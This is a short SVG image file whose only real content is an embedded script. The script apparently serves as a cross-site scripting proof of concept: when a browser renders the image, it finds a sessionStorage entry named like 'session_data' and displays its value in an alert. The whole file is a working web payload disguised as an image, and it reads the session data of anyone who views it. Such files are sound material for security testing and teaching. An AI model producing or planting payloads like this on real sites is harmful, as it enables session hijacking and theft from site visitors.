<svg>

  <script type="text/javascript">

     const sesKey = Object.keys(sessionStorage).find(key =>

      key.includes("session_data")

    );

    alert("here is your " + sessionStorage.getItem(sesKey))

  </script>

</svg>
